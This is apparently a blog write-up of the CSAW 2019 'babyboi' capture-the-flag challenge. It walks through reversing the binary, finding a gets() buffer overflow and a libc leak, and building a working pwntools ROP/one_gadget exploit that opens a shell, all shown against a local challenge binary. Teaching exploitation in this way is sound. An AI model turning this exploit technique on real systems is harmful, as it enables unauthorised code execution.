+++
categories = ["ROP","CTF","Linux"]
date = "2021-08-14"
description = "CSAW 2019 'babyboi' challenge writeup."
featuredpath = "date"
linktitle = ""
title = "CSAW 2019 :: Babyboi"
slug = "csaw-2019-babyboi"
type = "posts"
+++

## Reverse Engineering

Let's use the `file` command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.

```
$ file ./baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
```

We can also use pwntools' `checksec` tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.

This means a couple things for us:
 - We can't execute shellcode on the stack.
 - Probably vulnerable to a BOF as there is no stack canary.
 - We might be able to build a ROP chain somewhere.

```
checksec ./baby_boi 
[*] './baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Let's run the executable and see what happens. The binary appears to leak some address (kinda looks like an address in `libc`, we'll definitely be able to use this).

It also appears to prompt us for input. This is likely where we'll find a vulnerability we can exploit.

```
$ ./baby_boi
Hello!
Here I am: 0x7f6b6221ecf0
asdfasdf
```

Reversing the `main` function reveals that the address leaked is indeed within `libc`, it points to `printf`. We'll keep this in mind for later.

```
0x004006fc      488b05e50820.  mov rax, qword [reloc.printf] ; sym..got
0x00400703      4889c6         mov rsi, rax
0x00400706      488d3dae0000.  lea rdi, str.Here_I_am:__p_n ; 0x4007bb ; "Here I am: %p\n"
0x0040070d      b800000000     mov eax, 0
0x00400712      e879feffff     call sym..plt.got
```

Towards the end of the `main` function a call to `gets` is made. Wonderful, we've found a buffer overflow vulnerability.

```
0x00400717      488d45e0       lea rax, [s]
0x0040071b      4889c7         mov rdi, rax                ; char *s
0x0040071e      b800000000     mov eax, 0
0x00400723      e848feffff     call sym.imp.gets           ; char *gets(char *s)
0x00400728      b800000000     mov eax, 0
0x0040072d      c9             leave
0x0040072e      c3             ret
```

## Information Gathering

First, let's find the offset of the return address from the input buffer `*s` where `gets` stores our user input.

This is a small script that attaches the process to GDB before sending a large cyclic pattern of bytes. We can use this to determine the return address' offset.

```py
#!/usr/bin/env python3

from pwn import *


r = process('./baby_boi')
gdb.attach(r)

r.clean()
r.writeline(cyclic(300, n=8))

r.interactive()
```

After continuing in GDB, and looking at the top of the stack we can see we've overwritten the return address with our garbage data.

```
 ► 0x40072e <main+167>    ret    <0x6161616161616166>
```

Let's use pwntools' `cyclic_find` function to calculate the offset of the return address from the start of our input.

```py
In [2]: cyclic_find(0x6161616161616166, n=8)
Out[2]: 40
```

Now, let's do some investigation within GDB. Using the `info proc map` command we can see the start address where `libc` is loaded, we'll use this to calculate the offset of `printf` from the start of `libc`.

```
pwndbg> info proc map
process 1332
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 ./baby_boi
            0x600000           0x601000     0x1000        0x0 ./baby_boi
            0x601000           0x602000     0x1000     0x1000 ./baby_boi
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so

...

pwndbg> p printf
$1 = {int (const char *, ...)} 0x7ffff7e45cf0 <__printf>
pwndbg> p/x 0x7ffff7e45cf0 - 0x7ffff7def000
$4 = 0x56cf0
```

We can use a wonderful tool called `one_gadget` to get an address in our `libc` that will automatically give us a shell if we return to it (provided that the right conditions are met).

```
$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so                                                        130 ⨯
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

We'll use that first gadget, located at `0xcbd1a` in combination with our leaked `libc` address to get a shell.

Using `ropper` we can find a gadget that will allow us to setup the correct conditions for our magic gadget.

```
ropper --file ./baby_boi --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12

[INFO] File: ./baby_boi
0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
```


## Exploit Development

Now it's time to develop our exploit. Here's an outline of the main steps we want to take:
 - Capture the leaked `printf` address.
 - Calculate the start address of `libc` using the leak and the offset of `printf` we calculated earlier.
 - Overwrite the return address with the address of our setup gadget.
 - Return to `libc` and our magic gadget to get a shell.

```py
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


'''
0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
'''
setup = 0x40078c

'''
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL
'''
magic = 0x0cbd1a


pad = b'A'*40


elf = ELF('./baby_boi')
rop = ROP(elf)

rop.raw(setup)
rop.raw(0) # pop r12
rop.raw(0) # pop r13
rop.raw(0) # pop r14
rop.raw(0) # pop r15


r = process('./baby_boi')

r.readuntil('Here I am: ')
libc = eval(r.readline()[:-1]) - 0x56cf0
rop.raw(libc + magic)

r.writeline(pad + rop.chain())
r.interactive()
```

And finally, here's the exploit in action.

```
$ ./exploit.py 
[*] './baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './baby_boi'
[+] Starting local process './baby_boi': pid 2253
[*] Switching to interactive mode
$ cat flag.txt
csaw19{babyboi}
$ 
[*] Stopped process './baby_boi' (pid 2253)
```
